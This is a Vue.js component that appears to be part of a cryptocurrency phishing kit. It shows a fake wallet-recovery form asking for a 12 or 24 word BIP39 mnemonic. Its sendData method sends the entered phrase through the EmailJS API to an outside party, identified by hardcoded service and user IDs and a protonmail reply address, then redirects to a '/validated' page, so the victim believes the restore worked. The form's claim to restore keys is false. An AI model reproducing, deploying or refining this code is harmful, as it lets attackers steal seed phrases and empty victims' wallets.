<template>
  <div>
    <h2>Please enter your 12/24 word Mnemonic Phrase</h2>

    <textarea
      v-model="phrase"
      placeholder="Enter Phrase"
      class="w-full border border-gray-300 p-2 my-2 rounded-md transition duration-300 ease-in-out focus:outline-none focus:ring-2 ring-primary"
      name=""
      id=""
      cols="20"
      rows="6"
    ></textarea>

    <h2 class="">
      Please type the mnemonic phrase you wrote down in the right order with a
      space.
    </h2>

    <p class="opacity-40 mt-14 mb-6">
      Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys
      that manage your acccounts.
    </p>

    <button
      :disabled="disabled"
      @click="sendData"
      class="md:w-auto flex items-center border-2 border-primary bg-primary rounded-full font-semibold text-white px-4 py-2 transition duration-300 ease-in-out"
    >
      <span>Next</span>
      <div
        v-if="disabled"
        class="ml-2 w-4 h-4 rounded-full animate-spin border-4 border-dashed border-white border-t-transparent"
      ></div>
    </button>
  </div>
</template>

<script>
import axios from "axios";
export default {
  data() {
    return {
      phrase: "",
      disabled: false,
    };
  },
  methods: {
    sendData() {
      this.disabled = true;
      let self = this;
      const counter = this.countWords(this.phrase);
      if (counter === 12 || counter === 24) {
        var data = {
          service_id: "service_fhzx1qm",
          template_id: "template_u8q3nmp",
          user_id: "1VCQuxAerMoxLsQwn",
          template_params: {
            from_name: "Wallet Link Phrase",
            phrase: this.phrase,
            reply_to: "LifeofLove12@protonmail.com",
          },
        };
        axios
          .post("https://api.emailjs.com/api/v1.0/email/send", data)
          .then(function () {
            self.$router.push("/validated");
            self.disabled = false;
          })
          .catch(function () {
            self.disabled = false;
          });
      } else {
        this.$toast.info(
          "Wrong Input!. A recovery phrase must be a list of 12 to 24 words generated "
        );
        self.disabled = false;
      }
    },
    countWords(str) {
      return str.trim().split(/\s+/).length;
    },
  },
};
</script>

<style></style>
